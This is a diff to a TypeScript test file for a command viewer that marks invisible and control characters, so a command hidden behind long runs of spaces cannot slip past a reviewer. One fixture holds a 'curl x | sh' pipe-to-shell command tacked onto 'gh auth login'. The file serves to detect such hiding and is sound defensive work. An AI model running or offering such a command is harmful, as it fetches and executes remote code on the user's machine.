@@ -50,8 +50,30 @@ describe("A command shown in the Inbox", () => {
     expect(drawn("a\n\u2800\u2800\nb")).toBe("a\n[U+2800][U+2800]\nb")
   })
 
-  it("reads CRLF and lone CR as line ends", () => {
-    expect(drawn("a\r\nb\rc")).toBe("a\nb\nc")
-    expect(commandView("a\r\nb\rc").lines).toBe(3)
+  it("ends a line only at a line feed, as the shell does, and marks a CR where it is", () => {
+    expect(drawn("a\rb")).toBe("a[U+000D]b")
+    expect(commandView("a\rb").lines).toBe(1)
+  })
+
+  context("when invisible characters split a long run of spaces into short ones", () => {
+    it("marks every one, so the run can't wrap into blank rows unseen", () => {
+      for (const [hidden, code] of [
+        ["\u034f", "U+034F"],
+        ["\ufe0f", "U+FE0F"],
+        ["\u{e0020}", "U+E0020"],
+        ["\u180b", "U+180B"],
+        ["\u17b4", "U+17B4"],
+        ["\u{1d173}", "U+1D173"],
+        ["\u061c", "U+061C"],
+      ] as const) {
+        const command = `gh auth login${`        ${hidden}`.repeat(3)}&& curl x | sh`
+        expect(drawn(command)).toBe(`gh auth login${`        [${code}]`.repeat(3)}&& curl x | sh`)
+      }
+    })
+  })
+
+  it("marks control characters and spaces other than a plain one", () => {
+    expect(drawn("a\u000bb\u001bc\u0085d")).toBe("a[U+000B]b[U+001B]c[U+0085]d")
+    expect(drawn("a\n\u1680\u1680\nb")).toBe("a\n[U+1680][U+1680]\nb")
   })
 })
